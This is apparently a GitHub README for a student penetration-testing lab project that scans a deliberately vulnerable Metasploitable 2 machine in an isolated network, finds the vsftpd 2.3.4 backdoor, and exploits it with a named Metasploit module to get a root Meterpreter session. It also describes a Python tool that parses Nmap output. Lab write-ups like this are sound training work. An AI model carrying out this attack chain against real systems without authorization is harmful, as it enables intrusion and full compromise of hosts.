<div align="center">

# 🕶️ BLACKOUT

### Offensive Security Assessment & Automated Reconnaissance

<p>
<img src="https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white">
<img src="https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white">
<img src="https://img.shields.io/badge/Nmap-4D4D4D?style=for-the-badge">
<img src="https://img.shields.io/badge/Metasploit-2596CD?style=for-the-badge">
<img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=vmware&logoColor=white">
<img src="https://img.shields.io/badge/Status-Completed-success?style=for-the-badge">
</p>

<p>
<b>A hands-on offensive security laboratory demonstrating reconnaissance,
vulnerability assessment, controlled exploitation, post-exploitation,
and automated security analysis.</b>
</p>

</div>

---

## 📌 Overview

**BLACKOUT** is a hands-on offensive security project developed in an isolated VMware laboratory.

The project demonstrates an end-to-end penetration-testing workflow against an intentionally vulnerable **Metasploitable 2** machine.

The assessment progresses through:

```text
Reconnaissance
      │
      ▼
Service Enumeration
      │
      ▼
Version Detection
      │
      ▼
Vulnerability Identification
      │
      ▼
Vulnerability Validation
      │
      ▼
Controlled Exploitation
      │
      ▼
Post-Exploitation
      │
      ▼
Privilege Verification
      │
      ▼
Evidence Collection
```
BLACKOUT also includes a custom Python tool for analyzing Nmap reconnaissance results and generating structured security findings.

⚠️ All testing was performed against an intentionally vulnerable machine inside an isolated laboratory environment.

## ⚔️ Attack Laboratory

                    VMware Host-Only Network
                         192.168.254.0/24
                                │
               ┌────────────────┴────────────────┐
               │                                 │
               ▼                                 ▼
      ┌──────────────────┐             ┌──────────────────┐
      │    KALI LINUX    │             │  METASPLOITABLE 2│
      │                  │             │                  │
      │     ATTACKER     │────────────▶│      TARGET     │
      │                  │             │                  │
      │ 192.168.254.128  │             │ 192.168.254.130  │
      └──────────────────┘             └──────────────────┘
               │                                 │
               ▼                                 ▼
        Nmap / Metasploit                 Vulnerable Services
        Python Analysis                    Ubuntu 8.04

| Component                  | Role                  | Address            |
| -------------------------- | --------------------- | ------------------ |
| 🐉 Kali Linux              | Attacker / Assessment | `192.168.254.128`  |
| 🎯 Metasploitable 2        | Vulnerable Target     | `192.168.254.130`  |
| 🖥️ VMware Workstation Pro | Virtualization        | —                  |
| 🌐 Host-Only Network       | Isolated Lab Network  | `192.168.254.0/24` |

## 🎯 Objectives

### 🔐 Security Objectives

- Perform network reconnaissance
- Identify exposed services
- Fingerprint service versions
- Analyze the attack surface
- Research vulnerabilities
- Validate identified vulnerabilities
- Perform controlled exploitation
- Verify post-exploitation access
- Confirm privilege level
- Preserve assessment evidence

### 🐍 Development Objectives

- Parse Nmap output
- Extract service information
- Identify security findings
- Classify findings by severity
- Automate reconnaissance analysis
- Generate structured assessment output

## 🛠️ Technology Stack
| Category          | Technology             | Purpose                      |
| ----------------- | ---------------------- | ---------------------------- |
| Operating System  | Kali Linux             | Security testing             |
| Target            | Metasploitable 2       | Vulnerable laboratory target |
| Reconnaissance    | Nmap                   | Port & service enumeration   |
| Exploitation      | Metasploit             | Controlled exploitation      |
| Post-Exploitation | Meterpreter            | Access verification          |
| Development       | Python 3               | Security automation          |
| Virtualization    | VMware Workstation Pro | Laboratory environment       |

### 🔎 Reconnaissance

Nmap was used to perform service discovery and version detection against the target.

Scan Result

23 open TCP services discovered

Attack Surface
|       Port | Service    | Version / Information     |
| ---------: | ---------- | ------------------------- |
|   `21/tcp` | FTP        | vsftpd 2.3.4              |
|   `22/tcp` | SSH        | OpenSSH 4.7p1             |
|   `23/tcp` | Telnet     | Linux telnetd             |
|   `25/tcp` | SMTP       | Postfix smtpd             |
|   `53/tcp` | DNS        | ISC BIND 9.4.2            |
|   `80/tcp` | HTTP       | Apache 2.2.8              |
|  `111/tcp` | RPC        | rpcbind                   |
|  `139/tcp` | NetBIOS    | Samba                     |
|  `445/tcp` | SMB        | Samba                     |
|  `512/tcp` | rexec      | netkit-rsh                |
|  `513/tcp` | login      | login service             |
|  `514/tcp` | shell      | rshd                      |
| `1099/tcp` | Java RMI   | GNU Classpath             |
| `1524/tcp` | Bindshell  | Metasploitable root shell |
| `2049/tcp` | NFS        | NFS v2–4                  |
| `2121/tcp` | FTP        | ProFTPD 1.3.1             |
| `3306/tcp` | MySQL      | MySQL 5.0.51a             |
| `5432/tcp` | PostgreSQL | PostgreSQL 8.3.x          |
| `5900/tcp` | VNC        | Protocol 3.3              |
| `6000/tcp` | X11        | X11                       |
| `6667/tcp` | IRC        | UnrealIRCd                |
| `8009/tcp` | AJP13      | Apache Jserv              |
| `8180/tcp` | HTTP       | Apache Tomcat             |

📄 Raw reconnaissance evidence:

recon.txt

## 🚨 Vulnerability Assessment

The FTP service was selected for deeper investigation because it exposed:

vsftpd 2.3.4
Critical Finding
| Attribute | Finding               |
| --------- | --------------------- |
| Service   | FTP                   |
| Port      | `21/tcp`              |
| Version   | `vsftpd 2.3.4`        |
| CVE       | `CVE-2011-2523`       |
| Severity  | 🔴 **CRITICAL**       |
| Finding   | vsftpd 2.3.4 Backdoor |

Why It Matters

The affected vsftpd release is associated with a malicious backdoor that can result in unauthorized command execution.

The vulnerability was validated before exploitation.

## 🧪 Vulnerability Validation

Metasploit Framework was used to validate the identified vulnerability.

Module
```
exploit/unix/ftp/vsftpd_234_backdoor
```
Validation Result

```
[*] 192.168.254.130:21 - FTP banner hints its vulnerable:
220 (vsFTPd 2.3.4)

[*] 192.168.254.130:21 - The target appears to be vulnerable.
```

## 💥 Controlled Exploitation

The validated vulnerability was exploited against the isolated Metasploitable 2 target.

Result
```
[+] 192.168.254.130:21 - Backdoor has been spawned!


[*] Meterpreter session 1 opened
```
A Meterpreter session was successfully established.

## 👑 Post-Exploitation

Identity Verification
```
meterpreter > getuid

Server username: root
```
System Information
```
meterpreter > sysinfo


Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04
Architecture : i686
```

Root Verification
```
uid=0(root) gid=0(root)
```
### 🔴 ROOT ACCESS VERIFIED

### 🔗 Attack Chain
```
┌─────────────────────────┐
│     FTP : 21/tcp        │
│     vsftpd 2.3.4        │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│     CVE-2011-2523       │
│     Backdoor Vuln.      │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│ Vulnerability Validation│
│       Metasploit        │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│ Controlled Exploitation │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│   Meterpreter Session   │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│       ROOT ACCESS       │
│          UID 0          │
└─────────────────────────┘
```
### 🐍 BLACKOUT Analyzer

BLACKOUT includes a custom Python-based reconnaissance analyzer.

The tool processes Nmap output and converts raw reconnaissance data into structured security findings.

Analysis Pipeline
Nmap Scan
    │
    ▼
Output Parser
    │
    ▼
Service Extraction
    │
    ▼
Version Detection
    │
    ▼
Risk Classification
    │
    ▼
Security Assessment

Usage
```
python3 blackout.py recon.txt
```
### 📊 Assessment Dashboard

| 🔎 Services | 🚨 Critical | 💥 Exploitation | 👑 Privilege |
| :---------: | :---------: | :-------------: | :----------: |
|    **23**   |    **1**    |   **SUCCESS**   |   **ROOT**   |


### Key Findings

| Severity    |       Port | Finding                   | Status     |
| ----------- | ---------: | ------------------------- | ---------- |
| 🔴 Critical |   `21/tcp` | vsftpd 2.3.4 Backdoor     | Exploited  |
| 🔴 Critical | `1524/tcp` | Metasploitable Root Shell | Identified |
| 🟠 High     |   `23/tcp` | Telnet                    | Identified |

### 📂 Project Structure
```
blackout/
├── README.md
├── blackout.py
├── recon.txt
└── evidence/
    ├── nmap.txt
    └── vulnerability.txt
```
### 🧠 Skills Demonstrated

Offensive Security

Nmap • Metasploit • Meterpreter • Reconnaissance • Enumeration • Vulnerability Assessment • Exploitation • Post-Exploitation

Security Automation

Python • Regex • CLI Tools • Nmap Parsing • Finding Classification • Evidence Processing

Infrastructure

Kali Linux • Metasploitable 2 • VMware Workstation • Host-Only Networking • Linux

### ⚠️ Disclaimer

BLACKOUT was developed and tested exclusively within an authorized cybersecurity laboratory using an intentionally vulnerable Metasploitable 2 virtual machine.

The techniques demonstrated by this project can compromise real systems.

Never use these techniques against systems, networks, applications, or accounts without explicit authorization.

The author is not responsible for misuse of the information or tools contained in this repository.


<div align="center">
👤 Author

 Sovon Mitro

Cybersecurity | Penetration Testing | Python | AI/ML

BLACKOUT — Offensive Security Laboratory
</div> <div align="center">

⭐ If you found this project useful, consider giving the repository a star.

</div> 
